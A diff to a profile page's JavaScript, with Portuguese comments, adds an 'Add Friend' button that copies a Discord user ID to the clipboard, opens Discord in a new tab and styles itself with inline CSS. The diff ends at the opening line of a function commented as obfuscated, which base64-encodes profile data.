@@ -63,6 +63,70 @@ document.addEventListener('DOMContentLoaded', function() {
     
     console.log("Iniciando busca de perfil do Discord...");
     
+    // Adiciona botão para adicionar no Discord
+    const discordContainer = document.querySelector('.discord-info');
+    if (discordContainer) {
+        const addDiscordButton = document.createElement('button');
+        addDiscordButton.className = 'add-discord-btn';
+        addDiscordButton.innerHTML = '<i class="fas fa-user-plus"></i> Add Friend';
+        addDiscordButton.addEventListener('click', () => {
+            // Copia o ID para a área de transferência
+            navigator.clipboard.writeText(discordUserId).then(() => {
+                // Altera temporariamente o texto do botão para feedback
+                const originalText = addDiscordButton.innerHTML;
+                addDiscordButton.innerHTML = '<i class="fas fa-check"></i> ID Copied!';
+                
+                // Abre o Discord no navegador
+                window.open('https://discord.com/channels/@me', '_blank');
+                
+                // Restaura o texto original após 3 segundos
+                setTimeout(() => {
+                    addDiscordButton.innerHTML = originalText;
+                }, 3000);
+            }).catch(err => {
+                console.error('Erro ao copiar ID:', err);
+                // Abre o Discord de qualquer forma
+                window.open('https://discord.com/channels/@me', '_blank');
+            });
+        });
+        
+        // Adiciona o botão após as informações de status
+        const statusContainer = document.querySelector('.discord-status');
+        if (statusContainer) {
+            statusContainer.parentNode.insertBefore(addDiscordButton, statusContainer.nextSibling);
+        } else {
+            discordContainer.appendChild(addDiscordButton);
+        }
+        
+        // Adiciona estilo CSS inline para o botão
+        const style = document.createElement('style');
+        style.textContent = `
+            .add-discord-btn {
+                background-color: #5865F2;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                padding: 8px 12px;
+                margin-top: 10px;
+                cursor: pointer;
+                font-size: 14px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                transition: background-color 0.3s;
+            }
+            
+            .add-discord-btn i {
+                margin-right: 8px;
+            }
+            
+            .add-discord-btn:hover {
+                background-color: #4752C4;
+            }
+        `;
+        document.head.appendChild(style);
+    }
+    
     // Obfuscated updateDiscordProfile function
     function updateDiscordProfile(userData) {
         const _0x3b7c = btoa(JSON.stringify(userData));
